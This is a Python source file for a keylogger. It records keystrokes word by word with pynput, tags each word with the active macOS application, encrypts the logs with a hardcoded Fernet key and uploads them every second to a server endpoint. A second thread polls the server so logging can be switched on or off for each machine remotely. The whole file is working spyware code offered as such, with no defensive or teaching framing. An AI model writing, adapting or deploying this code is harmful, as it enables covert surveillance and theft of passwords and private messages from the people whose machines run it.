import time
import requests
import threading
import json
from pynput import keyboard
from pynput.keyboard import Key
from cryptography.fernet import Fernet
import platform
# import win32gui # Windowsttt
from AppKit import NSWorkspace # macOS


class KeyLoggerService:
    def __init__(self):
        self.key_log_dict = {}
        self.all_logs = []
        self.current_word = ""

    def add_key(self, key):
        now_time = time.strftime("%d/%m/%y %H:%M", time.localtime())
        app_name = self.get_active_application()
        key_str = str(key).replace("'", "")
        if key == Key.space:
            if self.current_word:
                if now_time in self.key_log_dict:
                    self.key_log_dict[now_time].append({"key": self.current_word, "app": app_name})
                else:
                    self.key_log_dict[now_time] = [{"key": self.current_word, "app": app_name}]
                self.current_word = ""
        elif key_str.isalnum() or key_str == "Key.backspace":
            if key_str == "Key.backspace" and self.current_word:
                self.current_word = self.current_word[:-1]
            elif key_str != "Key.backspace":
                self.current_word += key_str

    def save_and_clear(self):
        if self.key_log_dict:
            self.all_logs.append(self.key_log_dict)
            self.key_log_dict = {}
        return self.all_logs

    def get_logs(self):
        return self.all_logs

    def clear_logs(self):
        self.all_logs = []

    @staticmethod
    def get_active_application():
        # if platform.system() == "Windows": # Windows
        #     hwnd = win32gui.GetForegroundWindow() # Windows
        #     return win32gui.GetWindowText(hwnd) or "Unknown" # Windows

        if platform.system() == "Darwin": # macOS
            active_app = NSWorkspace.sharedWorkspace().activeApplication() # macOS
            return active_app.get("NSApplicationName", "Unknown") # macOS
        return "Unsupported"

    def format_logs(self):
        result = []
        for log_dict in self.all_logs:
            for time_key, entries in log_dict.items():
                for entry in entries:
                    result.append(f"[{time_key}] ({entry['app']}): {entry['key']}")
        return "\n".join(result)

class ServerSender:
    def __init__(self, server_url, service, machine_name=platform.node()):
        self.server_url = server_url
        self.service = service
        self.machine_name = machine_name
        self.key = b'9YxKn3m3G5qXz2o9xYxKn3m3G5qXz2o9xYxKn3m3G5q='
        self.fernet = Fernet(self.key)
        threading.Thread(target=self.send_to_server, daemon=True).start()

    def send_to_server(self):
        while True:
            logs = self.service.get_logs()
            if logs:
                new_task = {
                    "machine": self.machine_name,
                    "data": logs
                }
                try:
                    encrypted_data = self.fernet.encrypt(json.dumps(new_task).encode())
                    headers = {"X-Machine-Name": self.machine_name}
                    response = requests.post(self.server_url, data=encrypted_data, headers=headers)
                    if not response.ok:
                        print(f"Upload failed: {response.status_code} {response.text}")
                    else:
                        print("Upload OK")
                        self.service.clear_logs()
                except requests.exceptions.RequestException as e:
                    print(f"Error sending data: {e}")
            time.sleep(1)

class KeyLoggerManager:
    def __init__(self):
        self.service = KeyLoggerService()
        self.machine_name = platform.node()
        self.server_base = "http://127.0.0.1:5000"
        self.server_sender = ServerSender(f"{self.server_base}/api/upload", self.service, self.machine_name)
        self.listener = None
        threading.Thread(target=self._poll_toggle_state, daemon=True).start()

    def handle_key_press(self, key):
        self.service.add_key(key)
        if key == Key.space:
            self.service.save_and_clear()

    def start(self):
        if not self.listener:
            self.listener = keyboard.Listener(on_release=self.handle_key_press)
            self.listener.start()
            print("Keylogger started.")

    def stop(self):
        if self.listener:
            self.listener.stop()
            self.listener = None
            print("Keylogger stopped.")

    def toggle(self, start=True):
        if start:
            if not self.listener:
                print("Starting keylogger...")
                self.start()
        else:
            self.stop()

    def _poll_toggle_state(self):
        while True:
            try:
                url = f"{self.server_base}/api/toggle"
                params = {"machine": self.machine_name}
                resp = requests.get(url, params=params, timeout=5)
                if resp.ok:
                    desired = resp.json().get("status")
                    if desired is True and not self.listener:
                        self.start()
                    elif desired is False and self.listener:
                        self.stop()
            except requests.exceptions.RequestException as e:
                print(f"Toggle poll error: {e}")
            time.sleep(2)

if __name__ == "__main__":
    manager = KeyLoggerManager()
    manager.toggle(start=True)
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        manager.stop()
        print("Program exited.")